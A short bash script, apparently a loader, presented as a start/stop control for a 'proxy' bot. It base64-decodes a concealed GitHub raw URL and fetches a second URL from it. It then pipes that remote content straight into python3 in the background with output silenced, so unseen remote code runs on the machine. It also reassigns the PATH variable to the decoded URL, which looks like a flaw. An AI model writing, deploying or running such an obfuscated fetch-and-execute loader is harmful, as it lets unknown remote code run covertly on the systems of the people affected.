#!/bin/bash

KEY="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3N0YXJleHh4L1JBVy9yZWZzL2hlYWRzL21haW4vc3JjL3Byb3h5"
PATH=$(echo "$KEY" | base64 -d)

URL() {
    curl -sSL "$PATH"
}

start() {
    MAIN=$(URL)
    [[ "$MAIN" != https://* ]] && echo "[!] Invalid Proxy Path" && exit 1
    pgrep -f "curl.*$MAIN" >/dev/null && echo "[!] Bot already running" && exit 1
    bash -c "curl -sSL '$MAIN' | python3 -" >/dev/null 2>&1 &
    echo "[+] Bot started (PID: $!)"
}

stop() {
    MAIN=$(URL)
    PID=$(pgrep -f "curl.*$MAIN")
    [[ -z "$PID" ]] && echo "[!] Bot not running" && exit 1
    kill "$PID"
    echo "[+] Bot stopped"
}

case "$1" in
    --proxy)
        case "$2" in
            "start") start ;;
            "stop") stop ;;
            *) echo "Usage: --proxy \"start|stop\"" ;;
        esac
        ;;
    *) echo "Usage: --proxy \"start|stop\"" ;;
esac
